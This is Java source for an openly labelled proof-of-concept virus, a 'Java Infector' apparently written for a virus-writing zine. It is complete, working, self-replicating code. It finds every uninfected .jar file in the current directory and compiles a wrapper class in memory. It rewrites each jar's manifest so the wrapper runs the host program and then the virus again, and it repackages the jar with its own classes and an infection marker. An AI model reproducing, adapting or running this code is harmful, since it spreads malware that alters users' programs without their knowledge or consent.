/**
 * A little PoC Java Infector
 * @autor R3s1stanc3 [vxnetw0rk] r3s1stanc3@tormail.org
 * @version 1.0
 */

import java . io . * ;
import java . lang . reflect . InvocationTargetException ;
import java . net . URI ;
import java . util . Arrays ;
import java . util . * ;
import javax . tools . Diagnostic ;
import javax . tools . DiagnosticCollector ;
import javax . tools . JavaCompiler ;
import javax . tools . JavaFileObject ; 
import javax . tools . SimpleJavaFileObject ;
import javax . tools . ToolProvider ;
import javax . tools . JavaCompiler.CompilationTask ;
import javax . tools . JavaFileObject.Kind ;
import java . util . Enumeration ;
import java . util . zip . * ;
import java . util . LinkedList ;
import java . util . Iterator ;
import java . nio . file. * ;

public class CompileSourceInMemory {

    // needed for zipping
    static  int prefixLength ;
    static ZipOutputStream zipOut ;
    static byte [ ] ioBuffer = new byte [ 4096 ] ;
    // if this file exists in a jar file, it is infected 
    static String infectedStr = "kjlfaojdfaljgsdfaKdlkAUSfdld" ;
    
    public static void main ( String args [ ] ) throws IOException 
    {
        String workdir = System . getProperty ( "user.dir" ) ;
        String myName = getName ( ) ;
        String [ ] jarList = listJar ( ) ;
        try
        {
            extractArchive ( new File ( myName ), new File( "mytmpdir" ) ) ;
        }
        // Try to extract itself; else => exit
        catch ( Exception e ) { System . exit ( 0 ) ; }
        String [ ] oldFiles = listFiles ( "mytmpdir" ) ;
        for ( String s : jarList )
        {
        if ( s . equals ( myName ) ) continue ;
        try
        {
            extractArchive ( new File ( s ), new File( "tmpdir" ) ) ;
        }
        catch ( Exception e ) { }
        if ( isInfected ( "tmpdir" ) )
        {
            deleteFile ( new File ( "tmpdir" ) ) ;
            continue ;
        }
        String classNameTemp = readFile ( "tmpdir/META-INF/MANIFEST.MF" ) . split ( System.getProperty("line.separator") ) [ 2 ] . split ( "Main-Class: " ) [ 1 ] ;
        String className = "" ;
        // get the classname of the hosts main class (there are some strance chars in the MANIFEST.MF so I had no other way to get te name)
        for ( int i = 0; i < classNameTemp . length ( ) - 1; i ++ )
        {
            className += classNameTemp . charAt ( i ) ;
        }
        //System . out . println ( className ) ;
        JavaCompiler compiler = ToolProvider . getSystemJavaCompiler ( ) ;
        DiagnosticCollector <JavaFileObject> diagnostics = new DiagnosticCollector <JavaFileObject> ( ) ;
        
        StringWriter writer = new StringWriter ( ) ;
        PrintWriter out = new PrintWriter ( writer ) ;
        out . println ( "public class Infect {" ) ;
        out . println ( "  public static void main(String args[]) {" ) ;
        out . println ( "     javax . swing . JOptionPane . showMessageDialog ( null, \"Hi this is Java Infect0r\nand welcome to Valhalla #3!\" ) ;" ) ; 
        out . println ( "     " + className + " a = new " + className + " ( );" ) ;
        out . println ( "     a . main ( args ) ;" ) ;
        out . println ( "     CompileSourceInMemory b = new CompileSourceInMemory ( ) ; " ) ;
        out . println ( "     try {" ) ;
        out . println ( "     b . main ( args ) ; } " ) ;
        out . println ( "     catch ( Exception e ) { }" ) ;
        out . println ( "  }" ) ;
        out . println ( "}" ) ;
        // create a temporary class with the name of the main class to prevent errors while compiling
        out . println ( " class " + className + "{" ) ;
        out . println ( "     public static void main (String[] args){System.out.println();}" ) ;
        out . println ( "}" ) ;
        out . close ( ) ;
        
        
        JavaFileObject file = new JavaSourceFromString ( "Infect", writer . toString ( ) ) ;
                
        Iterable <? extends JavaFileObject> compilationUnits = Arrays . asList ( file ) ;
        CompilationTask task = compiler . getTask (null, null, diagnostics, null, null, compilationUnits ) ;
                
        boolean success = task . call ( ) ;
        
        String manifest = readFile ( "tmpdir/META-INF/MANIFEST.MF" ) ;
        manifest = manifest . replaceAll ( className, "Infect" ) ;
        deleteFile ( new File ( "tmpdir/META-INF/MANIFEST.MF" ) ) ;
        writeFile ( "tmpdir/META-INF/MANIFEST.MF", manifest ) ;
        writeFile ( "tmpdir/" + infectedStr, infectedStr ) ;
        copyFile ( "Infect.class", "tmpdir/Infect.class" ) ;
        for ( String f : oldFiles )
        {
            if ( f . indexOf ( ".class" ) != -1 )
                copyFile ( "mytmpdir/" + f, "tmpdir/" + f ) ;
        }
        copyFile ( "mytmpdir/CompileSourceInMemory.class", "tmpdir/CompileSourceInMemory.class" ) ;
        copyFile ( "mytmpdir/JavaSourceFromString.class", "tmpdir/JavaSourceFromString.class" ) ;
        
        deleteFile ( new File ( s ) ) ;
        
        String dirFileName = workdir + "/tmpdir/" ;
        prefixLength = dirFileName . lastIndexOf ( "/" ) + 1 ;
        zipOut = new ZipOutputStream ( new FileOutputStream ( s ) ) ;
        try
        {
            createZipFrom ( new File ( dirFileName ) ) ;
        }
        catch ( Exception e ) { }
        zipOut . close ( ) ;
        
        // delete temporary files
        deleteFile ( new File ( "tmpdir" ) ) ;
        deleteFile ( new File ( "Infect.class" ) ) ;
        deleteFile ( new File ( className + ".class" ) ) ;
        }
        deleteFile ( new File ( "mytmpdir" ) ) ;
    }
    
    /**
     * Checks if the file is infected; If a file called "kjlfaojdfaljgsdfaKdlkAUSfdld" is in the directory, it is infected
     * @param dir The directory to check
     * @return true -> infected; false -> not infected
     */
    public static boolean isInfected ( String dir )
    {
        boolean infected = false ;
        for ( String s : listFiles ( dir ) )
        {
            if ( s . equals ( infectedStr )  ) 
            {
                infected = true ;
                break ;
            }
        }
        return infected ;
    }
    
    /**
     * Function to get the file name of the running file
     * @return Filename as String
     */
    public static String getName ( )
    {
        
        String path = System.getProperty("java.class.path") ;
        String [ ] pathA ;
        if ( System.getProperty("os.name") . indexOf ( "Win" ) != -1 ) pathA = path . split ( "\\" ) ;
        else pathA = path . split ( "//" ) ;
        return pathA [ pathA . length - 1 ] ;
        
    }
    
    /**
     * Lists all *.jar files in the current directory
     * @return String Array with all file names
     */
    public static  String [ ] listJar ( )
    {
        
        File dir = new File ( "./" ) ;
        String [ ] fileList = dir . list ( new FilenameFilter ( )
        {
            public boolean accept ( File d, String name )
            {
                return name . endsWith ( ".jar" ) ;
            }
        } ) ;
        return fileList ;
        
    }
    
    /**
     * Lists all  in a directory
     * @return String Array with all file names
     */
    public static  String [ ] listFiles ( String directory )
    {
        
        File dir = new File ( directory ) ;
        String [ ] fileList = dir . list ( ) ;
        return fileList ;
        
    }
    
    /**
     * Reads the content of a file
     * @param name Name of the file
     * @return The files content as String
     */
    public static String readFile ( String name )
    {
        
        try
        {
            RandomAccessFile file = new RandomAccessFile ( name, "r" ) ;
            byte [ ] data = new byte [ ( int ) file . length ( ) ] ;
            
            file . read ( data ) ;
            
            file . close ( ) ;
            
            return new String ( data ) ;
        }
        catch ( Exception e ) { return null ; }
        
    }
    
    /**
     * Writes a String to a file
     * @param fi File to write to
     * @param data String to write in the file
     */
    public static void writeFile ( String fi, String data )
    {
        
        try
        {
            File file = new File ( fi ) ;
            FileWriter fw = new FileWriter ( file ) ;
            fw . write ( data ) ;
            fw . flush ( ) ;
            fw . close ( ) ;
        }
        catch ( Exception e ) { }
        
    }
    
    /**
     * Extracts a zip archive
     * @param archive The archive to extract
     * @param destDir The destination folder to extract the file to
     */
    public static void extractArchive ( File archive, File destDir ) throws Exception 
    {
        
        if ( ! destDir . exists ( ) ) 
        {
            destDir . mkdir ( ) ;
        }
 
        ZipFile zipFile = new ZipFile ( archive ) ;
        Enumeration entries = zipFile . entries ( ) ;
 
        byte [ ] buffer = new byte [ 16384 ] ;
        int len ;
        while ( entries . hasMoreElements ( ) ) 
        {
            ZipEntry entry = (ZipEntry) entries . nextElement ( ) ;
 
            String entryFileName = entry . getName ( ) ;
 
            File dir = dir = buildDirectoryHierarchyFor ( entryFileName, destDir ) ;
            if ( ! dir . exists ( ) ) 
            {
                dir . mkdirs ( ) ;
            }
 
            if ( ! entry . isDirectory ( ) ) 
            {
                BufferedOutputStream bos = new BufferedOutputStream ( new FileOutputStream ( new File ( destDir, entryFileName ) ) ) ;
 
                BufferedInputStream bis = new BufferedInputStream ( zipFile . getInputStream ( entry ) ) ;
 
                while ( ( len = bis . read ( buffer ) ) > 0 ) 
                {
                    bos . write ( buffer, 0, len ) ;
                }
 
                bos . flush ( ) ;
                bos . close ( ) ;
                bis . close ( ) ;
            }
        }
                zipFile . close ( ) ;
    }
 
    private static File buildDirectoryHierarchyFor ( String entryName, File destDir ) 
    {
        int lastIndex = entryName . lastIndexOf ( '/' ) ;
        String entryFileName = entryName . substring ( lastIndex + 1 ) ;
        String internalPathToEntry = entryName . substring ( 0, lastIndex + 1 ) ;
        return new File ( destDir, internalPathToEntry ) ;
    }
    
    /**
     * Deletes a file
     * @param file File to delete
     */
    public static void deleteFile ( File file )
    {
        
        if ( file . isDirectory ( ) ) 
        {
            String [ ] entries = file . list ( ) ;
            for ( int x = 0; x < entries . length; x ++ ) 
            {
                File currentFile = new File ( file . getPath ( ), entries [ x ] ) ;
                deleteFile ( currentFile ) ;
            }
            file . delete ( ) ;
        }
        else{
            file . delete ( ) ;
        }
        
    }
    
    
    
    /**
     * Copies a file to a destination
     * @param source Name of the source file
     * @param dest Name of the destination file
     */
    public static void copyFile ( String source, String dest )
    {
        
        try
        {
            File f1 = new File ( source ) ;
            File f2 = new File ( dest ) ;
            
            InputStream in = new FileInputStream ( f1 ) ;
            OutputStream out = new FileOutputStream ( f2 ) ;
            
            byte [ ] buf = new byte [ 1024 ] ;
            int len ;
            
            while ( ( len = in . read ( buf ) ) > 0 )
            {
                out . write ( buf, 0, len ) ;
            }
            
            in . close ( ) ;
            out . close ( ) ;
            f2 . setExecutable ( true ) ;
        }
        catch ( FileNotFoundException ex ) { }
        catch ( IOException e ) { }

    }
    
    
    
    // To zip the tmpdir again

    static void createZipFrom ( File dir ) throws Exception
    { 
        if ( dir . exists ( ) && dir . canRead ( ) && dir . isDirectory ( ) )
        { 
            File [ ] files = dir . listFiles ( ) ;
            if ( files != null )
            { 
                for ( File file : files )
                { 
                    if ( file . isDirectory ( ) ) 
                    { 
                        createZipFrom ( file ) ;
                    }
                    else
                    { 
                        String filePath = file . getPath ( ) . replace ( '\\', '/' ) ;
                        FileInputStream in = new FileInputStream ( filePath ) ;
                        zipOut . putNextEntry ( new ZipEntry ( filePath . substring ( prefixLength ) ) ) ;
                        int bytesRead ;
                        while ( ( bytesRead = in . read ( ioBuffer ) ) > 0 ) 
                        { 
                            zipOut . write ( ioBuffer, 0, bytesRead ) ;
                        }
                        zipOut . closeEntry ( ) ;
                        in . close ( ) ;
                    }
                }
            }
        }
    }
}
    
class JavaSourceFromString extends SimpleJavaFileObject 
{
      final String code ;

      JavaSourceFromString ( String name, String code ) 
      {
          super ( URI . create ( "string:///" + name . replace ('.', '/' ) + Kind . SOURCE . extension ), Kind . SOURCE ) ;
          this . code = code ;
      }
        
      @Override
      public CharSequence getCharContent ( boolean ignoreEncodingErrors ) 
      {
          return code ;
      }
}